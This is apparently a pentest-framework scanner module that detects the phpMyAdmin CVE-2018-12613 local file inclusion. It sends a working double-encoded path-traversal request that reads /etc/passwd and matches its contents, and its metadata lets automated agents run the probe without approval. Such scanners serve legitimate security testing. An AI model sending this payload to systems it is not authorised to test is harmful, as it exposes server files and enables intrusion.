#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PhpMyAdmin before version 4."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PhpMyAdmin <4.8.2 - Local File Inclusion Detection',
        'description': 'PhpMyAdmin before version 4.8.2 is susceptible to local file inclusion that allows an attacker to include (view and potentially execute) files on the server. The vulnerability comes from a portion of code where pages are redirected and loaded within phpMyAdmin, and an improper test for whitelisted pages. An attacker must be authenticated, except in the "$cfg[\'AllowArbitraryServer\'] = true" case (where an attacker can specify any host he/she is already in control of, and execute arbitrary code on phpMyAdmin) and the "$cfg[\'ServerDefault\'] = 0" case (which bypasses the login requirement and runs the vulnerable code without any authentication).',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'modules': [
            'exploits/multi/http/phpmyadmin_cve_2018_12613_rce',
        ],
        'tags': ['web', 'scanner', 'cve', 'cve2018', 'vulhub', 'edb', 'phpmyadmin', 'lfi', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/vulhub/vulhub/tree/master/phpmyadmin/CVE-2018-12613',
            'https://www.phpmyadmin.net/security/PMASA-2018-4/',
            'https://www.exploit-db.com/exploits/44928/',
            'https://nvd.nist.gov/vuln/detail/CVE-2018-12613',
            'https://security.gentoo.org/glsa/201904-16',
        ],
        'cve': 'CVE-2018-12613',
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="PhpMyAdmin <4.8.2 - Local File Inclusion detected",
                path='/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd',
            )
            return True
        return False

